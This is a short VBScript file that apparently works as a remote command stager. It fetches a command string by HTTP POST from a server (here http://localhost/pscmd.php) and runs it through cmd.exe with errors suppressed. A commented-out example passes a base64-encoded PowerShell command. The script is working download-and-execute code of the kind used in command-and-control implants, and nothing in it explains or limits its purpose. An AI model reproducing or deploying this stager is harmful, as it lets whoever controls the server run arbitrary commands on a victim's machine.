Function GetPage(Method,Url,Async,PostContent,FileName)
	Set xmlHttp = CreateObject("microsoft.xmlhttp")
	xmlHttp.open Method,Url,Async
	If Method = "POST" Then
	   xmlhttp.setRequestHeader "Content-Type","application/x-www-form-urlencoded"
	   xmlhttp.setRequestHeader "Content-Length",Len(PostContent)
	End If
	xmlHttp.send(PostContent)
	If Async = False Then 
		GetPage = BytesToBstr(xmlHttp.responseBody,"UTF-8",FileName) 
	Else 
		GetPage = ""
	End If
End Function

Function BytesToBstr(body,Cset,FileName)
	Set objstream = CreateObject("ADODB.Stream")
	with objstream
		.Type = 1
		.Mode =3
		.Open
		.Write body
		If not trim(FileName)="" Then .SaveToFile LCase(FileName),2
		.Position = 0
		.Type = 2
		.Charset = Cset
	End With
	BytesToBstr = objstream.ReadText
	objstream.Close
End Function


function runTask(byval args)
	On Error Resume Next
	
	Dim strText
	Set oShell = CreateObject("WScript.Shell")
	Set oExec = oShell.Exec("%COMSPEC% /C start "+args)
	Do While Not oExec.StdOut.AtEndOfStream
		strText = oExec.StdOut.ReadAll()
	Loop

	runTask = strText
	
	oExec.Terminate
	
	Set oShell = Nothing
	Set oExec = Nothing
End function

'msg = runTask("ping -n 2 127.0.0.1")
'Wscript.Echo msg

'cmdstr="powershell -enc dwBoAG8AYQBtAGkACgA="
'msg = runTask(cmdstr)
'Wscript.Echo msg

cmdstr = GetPage("POST","http://localhost/pscmd.php",False,"","")

msg = runTask(cmdstr)
Wscript.Echo msg



